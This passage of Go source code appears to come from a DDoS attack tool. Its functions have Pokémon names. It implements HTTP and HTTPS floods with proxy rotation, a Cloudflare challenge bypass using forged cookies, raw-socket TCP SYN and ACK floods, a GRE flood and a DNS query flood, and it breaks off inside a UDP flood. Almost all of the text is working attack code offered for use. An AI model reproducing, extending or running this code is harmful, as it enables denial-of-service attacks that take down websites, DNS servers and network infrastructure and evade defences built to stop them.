	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
	"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
	"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
	"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
	"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
	"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
	"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
	"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
	"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
}

// ============================================================================
// L7 (APPLICATION LAYER) ATTACK FUNCTIONS
// These perform HTTP/HTTPS floods to overwhelm web servers.
// ============================================================================

// alakazam performs HTTP flood attack (wrapper for alakazamProxy without proxy).
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 80)
//   - duration: Attack duration in seconds
func alakazam(target string, targetPort, duration int) {
	alakazamProxy(target, targetPort, duration, false)
}

// alakazamProxy performs HTTP POST flood with optional proxy rotation.
// Spawns cozyBear (default 2024) concurrent workers sending POST requests.
// In proxy mode, rotates proxies periodically to avoid IP blocking.
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 80)
//   - duration: Attack duration in seconds
//   - useProxy: Enable proxy rotation from loaded proxy list
func alakazamProxy(target string, targetPort, duration int, useProxy bool) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var wg sync.WaitGroup
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)
	userAgents := []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (Linux; Android 11; SM-G996B)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"}
	referers := []string{"https://www.google.com/", "https://www.example.com/", "https://www.wikipedia.org/"}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var client *http.Client
			if useProxy {
				proxyAddr := persian()
				if proxyAddr != "" {
					var err error
					client, err = meowstic(proxyAddr, 30*time.Second)
					if err != nil {
						client = &http.Client{Timeout: 30 * time.Second}
					}
				} else {
					client = &http.Client{Timeout: 30 * time.Second}
				}
			} else {
				client = &http.Client{Timeout: 30 * time.Second}
			}
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					// Rotate proxy periodically in proxy mode
					if useProxy && rand.Intn(100) < 10 {
						proxyAddr := persian()
						if proxyAddr != "" {
							newClient, err := meowstic(proxyAddr, 30*time.Second)
							if err == nil {
								client = newClient
							}
						}
					}
					body := make([]byte, 1024)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					resp, _ := client.Do(req)
					if resp != nil {
						resp.Body.Close()
					}
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// machamp performs HTTPS/TLS flood attack (wrapper for machampProxy without proxy).
// Parameters:
//   - target: Target hostname or IP
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
func machamp(target string, targetPort, duration int) {
	machampProxy(target, targetPort, duration, false)
}

// machampProxy performs HTTPS flood with TLS connection reuse and optional proxy support.
// Uses TLS 1.2-1.3 and sends multiple HTTP requests per connection.
// Randomizes: HTTP methods (GET/POST/HEAD), paths, and User-Agents.
// Parameters:
//   - target: Target hostname
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
//   - useProxy: Enable proxy mode using loaded proxy list
func machampProxy(target string, targetPort, duration int, useProxy bool) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	if idx := strings.Index(hostname, ":"); idx != -1 {
		hostname = hostname[:idx]
	}

	// For proxy mode, use HTTP client with proxy
	if useProxy {
		scheme := "https"
		targetURL := fmt.Sprintf("%s://%s:%d", scheme, hostname, targetPort)
		paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
		methods := []string{"GET", "POST", "HEAD"}

		for i := 0; i < cozyBear; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				var client *http.Client
				proxyAddr := persian()
				if proxyAddr != "" {
					var err error
					client, err = meowstic(proxyAddr, 30*time.Second)
					if err != nil {
						return
					}
				} else {
					return // No proxy available, skip this worker
				}

				for {
					select {
					case <-ctx.Done():
						return
					case <-stopCh:
						return
					default:
						// Rotate proxy periodically
						if rand.Intn(100) < 10 {
							proxyAddr := persian()
							if proxyAddr != "" {
								newClient, err := meowstic(proxyAddr, 30*time.Second)
								if err == nil {
									client = newClient
								}
							}
						}

						method := methods[rand.Intn(len(methods))]
						path := paths[rand.Intn(len(paths))]
						ua := eevee[rand.Intn(len(eevee))]
						reqURL := fmt.Sprintf("%s%s", targetURL, path)

						var req *http.Request
						var err error
						if method == "POST" {
							body := turla(rand.Intn(1024) + 256)
							req, err = http.NewRequest(method, reqURL, strings.NewReader(body))
						} else {
							req, err = http.NewRequest(method, reqURL, nil)
						}
						if err != nil {
							continue
						}

						req.Header.Set("Host", hostname)
						req.Header.Set("User-Agent", ua)
						req.Header.Set("Accept", "text/html,application/xhtml+xml")
						req.Header.Set("Connection", "keep-alive")

						resp, err := client.Do(req)
						if resp != nil {
							io.Copy(io.Discard, resp.Body)
							resp.Body.Close()
						}
						atomic.AddInt64(&requestCount, 1)
					}
				}
			}()
		}
		wg.Wait()
		return
	}

	// Original direct connection mode
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetAddr := fmt.Sprintf("%s:%d", resolvedIP, targetPort)
	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: hostname, MinVersion: tls.VersionTLS12, MaxVersion: tls.VersionTLS13}
	paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
	methods := []string{"GET", "POST", "HEAD"}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					conn, err := tls.DialWithDialer(dialer, "tcp", targetAddr, tlsConfig)
					if err != nil {
						continue
					}
					for j := 0; j < 10; j++ {
						select {
						case <-ctx.Done():
							conn.Close()
							return
						case <-stopCh:
							conn.Close()
							return
						default:
						}
						method := methods[rand.Intn(len(methods))]
						path := paths[rand.Intn(len(paths))]
						ua := eevee[rand.Intn(len(eevee))]
						var reqBuilder strings.Builder
						reqBuilder.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
						reqBuilder.WriteString(fmt.Sprintf("Host: %s\r\n", hostname))
						reqBuilder.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
						reqBuilder.WriteString("Accept: text/html,application/xhtml+xml\r\n")
						reqBuilder.WriteString("Connection: keep-alive\r\n")
						if method == "POST" {
							body := turla(rand.Intn(1024) + 256)
							reqBuilder.WriteString(fmt.Sprintf("Content-Length: %d\r\n\r\n", len(body)))
							reqBuilder.WriteString(body)
						} else {
							reqBuilder.WriteString("\r\n")
						}
						conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
						if _, err := conn.Write([]byte(reqBuilder.String())); err != nil {
							break
						}
						atomic.AddInt64(&requestCount, 1)
					}
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

// ============================================================================
// SESSION MANAGEMENT FOR CF BYPASS
// These structs and functions manage HTTP sessions with cookie persistence.
// ============================================================================

// ditto represents a browser session with cookies and persistent User-Agent.
// Used for maintaining state across requests (required for Cloudflare bypass).
type ditto struct {
	cookies   []*http.Cookie // Collected cookies from responses
	userAgent string         // Consistent User-Agent for session
	client    *http.Client   // HTTP client with cookie jar
}

// zorua creates a new browser session with cookie support.
// Initializes an HTTP client with TLS config and cookie jar.
// Returns: Configured ditto session ready for requests
func zorua() *ditto {
	jar, _ := zoroark()
	return &ditto{
		cookies:   nil,
		userAgent: eevee[rand.Intn(len(eevee))],
		client: &http.Client{
			Timeout: 30 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
				DisableKeepAlives: false,
				MaxIdleConns:      100,
				IdleConnTimeout:   90 * time.Second,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

// zoruaWithProxy creates a browser session configured to use a proxy.
// Same as zorua but routes all requests through the specified proxy.
// Falls back to non-proxy session if proxy URL is invalid.
// Parameters:
//   - proxyAddr: Proxy URL (http://ip:port or with auth)
//
// Returns: Configured ditto session with proxy support
func zoruaWithProxy(proxyAddr string) *ditto {
	jar, _ := zoroark()
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return zorua() // Fallback to non-proxy version
	}
	return &ditto{
		cookies:   nil,
		userAgent: eevee[rand.Intn(len(eevee))],
		client: &http.Client{
			Timeout: 30 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				Proxy:             http.ProxyURL(proxyURL),
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
				DisableKeepAlives: false,
				MaxIdleConns:      100,
				IdleConnTimeout:   90 * time.Second,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

// zoroark creates a new cookie jar for session management.
// Returns: Thread-safe cookie jar implementation
func zoroark() (http.CookieJar, error) {
	return &mimikyu{cookies: make(map[string][]*http.Cookie)}, nil
}

// mimikyu implements http.CookieJar interface for storing cookies per host.
// Thread-safe using mutex for concurrent access.
type mimikyu struct {
	mu      sync.Mutex
	cookies map[string][]*http.Cookie
}

// SetCookies stores cookies for a URL's host.
func (j *mimikyu) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.cookies[u.Host] = append(j.cookies[u.Host], cookies...)
}

// Cookies returns stored cookies for a URL's host.
func (j *mimikyu) Cookies(u *url.URL) []*http.Cookie {
	j.mu.Lock()
	defer j.mu.Unlock()
	return j.cookies[u.Host]
}

// gastly attempts to bypass Cloudflare protection by following the JS challenge flow.
// Makes initial request, waits if challenged (503/403), then retries with cookies.
// Parameters:
//   - targetURL: Full URL to access and bypass
//
// Returns: error if bypass fails
func (s *ditto) gastly(targetURL string) error {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", s.userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	s.cookies = resp.Cookies()
	if resp.StatusCode == 503 || resp.StatusCode == 403 {
		time.Sleep(5 * time.Second)
		req2, _ := http.NewRequest("GET", targetURL, nil)
		req2.Header.Set("User-Agent", s.userAgent)
		for _, c := range s.cookies {
			req2.AddCookie(c)
		}
		resp2, err := s.client.Do(req2)
		if err != nil {
			return err
		}
		defer resp2.Body.Close()
		s.cookies = resp2.Cookies()
	}
	return nil
}

// gyarados performs Cloudflare bypass flood (wrapper for gyaradosProxy without proxy).
// Parameters:
//   - target: Target hostname
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
func gyarados(target string, targetPort, duration int) {
	gyaradosProxy(target, targetPort, duration, false)
}

// gyaradosProxy performs Cloudflare bypass flood with session management.
// Each worker maintains a persistent session with cookies.
// Attempts to solve CF JS challenges before flooding with requests.
// Adds fake __cf_bm cookies to appear as legitimate traffic.
// Parameters:
//   - target: Target hostname
//   - targetPort: Target port (typically 443)
//   - duration: Attack duration in seconds
//   - useProxy: Enable proxy rotation for each session
func gyaradosProxy(target string, targetPort, duration int, useProxy bool) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var bypassCount int64
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	scheme := "https"
	if targetPort == 80 {
		scheme = "http"
	}
	targetURL := fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort)
	paths := []string{"/", "/index.php", "/wp-login.php", "/admin", "/api/v1/", "/search?q=" + turla(8), "/cdn-cgi/trace"}
	sessionWorkers := 50
	if cozyBear < sessionWorkers {
		sessionWorkers = cozyBear
	}
	for i := 0; i < sessionWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			var session *ditto
			if useProxy {
				proxyAddr := persian()
				if proxyAddr != "" {
					session = zoruaWithProxy(proxyAddr)
				} else {
					session = zorua()
				}
			} else {
				session = zorua()
			}
			if session.gastly(targetURL) == nil {
				atomic.AddInt64(&bypassCount, 1)
			}
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					// Rotate proxy periodically in proxy mode
					if useProxy && rand.Intn(100) < 5 {
						proxyAddr := persian()
						if proxyAddr != "" {
							session = zoruaWithProxy(proxyAddr)
							session.gastly(targetURL) // Re-bypass with new proxy
						}
					}
					path := paths[rand.Intn(len(paths))]
					reqURL := fmt.Sprintf("%s://%s:%d%s", scheme, hostname, targetPort, path)
					req, err := http.NewRequest("GET", reqURL, nil)
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", session.userAgent)
					req.Header.Set("Accept", "text/html,application/xhtml+xml")
					req.Header.Set("Connection", "keep-alive")
					for _, c := range session.cookies {
						req.AddCookie(c)
					}
					req.AddCookie(&http.Cookie{Name: "__cf_bm", Value: turla(32)})
					resp, err := session.client.Do(req)
					if err != nil {
						continue
					}
					if len(resp.Cookies()) > 0 {
						session.cookies = append(session.cookies, resp.Cookies()...)
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
					if resp.StatusCode == 503 || resp.StatusCode == 403 {
						time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
						session.gastly(targetURL)
					}
				}
			}
		}()
	}
	wg.Wait()
}

// ============================================================================
// L4 (TRANSPORT LAYER) ATTACK FUNCTIONS
// These perform raw packet floods to overwhelm network infrastructure.
// Require root/CAP_NET_RAW capability for raw socket access.
// ============================================================================

// dragonite performs a TCP SYN flood attack using raw sockets.
// Sends SYN packets with random source ports and sequence numbers.
// Maximum payload size to amplify bandwidth consumption.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target TCP port
//   - duration: Attack duration in seconds
func dragonite(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					tcpLayer := &layers.TCP{SrcPort: layers.TCPPort(rand.Intn(52024) + 1024), DstPort: layers.TCPPort(targetPort), Seq: rand.Uint32(), Window: 12800, SYN: true, DataOffset: 5}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// tyranitar performs a TCP ACK flood attack using raw sockets.
// ACK floods can bypass some SYN flood protections.
// Sends ACK packets with random sequence and acknowledgment numbers.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target TCP port
//   - duration: Attack duration in seconds
//
// Returns: error if target resolution fails
func tyranitar(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					tcpLayer := &layers.TCP{SrcPort: layers.TCPPort(rand.Intn(64312) + 1024), DstPort: layers.TCPPort(targetPort), ACK: true, Seq: rand.Uint32(), Ack: rand.Uint32(), Window: 12800, DataOffset: 5}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	return nil
}

// metagross performs a GRE (Generic Routing Encapsulation) protocol flood.
// GRE floods are effective against routers and can cause routing issues.
// Uses raw IP sockets with protocol 47 (GRE).
// Parameters:
//   - targetIP: Target IP address or hostname
//   - duration: Attack duration in seconds
//
// Returns: error if target resolution fails
func metagross(targetIP string, duration int) error {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					greLayer := &layers.GRE{}
					payload := make([]byte, 65535-24)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	return nil
}

// salamence performs a DNS query flood attack.
// Sends random DNS queries to overwhelm DNS servers.
// Randomizes: query domains, query types (A, AAAA, MX, NS).
// Includes EDNS0 extension for larger response sizes.
// Parameters:
//   - targetIP: Target DNS server IP or hostname
//   - targetPort: Target port (typically 53)
//   - duration: Attack duration in seconds
func salamence(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup
	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := garchomp(domain, queryType)
					buffer, _ := dnsQuery.Pack()
					conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: targetPort})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// garchomp constructs a DNS query message for the flood attack.
// Adds EDNS0 OPT record to request larger UDP responses.
// Parameters:
//   - domain: Domain name to query
//   - queryType: DNS query type (A=1, AAAA=28, MX=15, NS=2)
//
// Returns: Constructed DNS message ready to pack and send
func garchomp(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096)
	msg.Extra = append(msg.Extra, edns0)
	return msg
}

// snorlax performs a UDP flood attack.
// Opens multiple UDP connections and sends fixed-size payloads.
// Simpler than raw socket attacks but effective against UDP services.
// Parameters:
//   - targetIP: Target IP address or hostname
//   - targetPort: Target UDP port
//   - duration: Attack duration in seconds
func snorlax(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
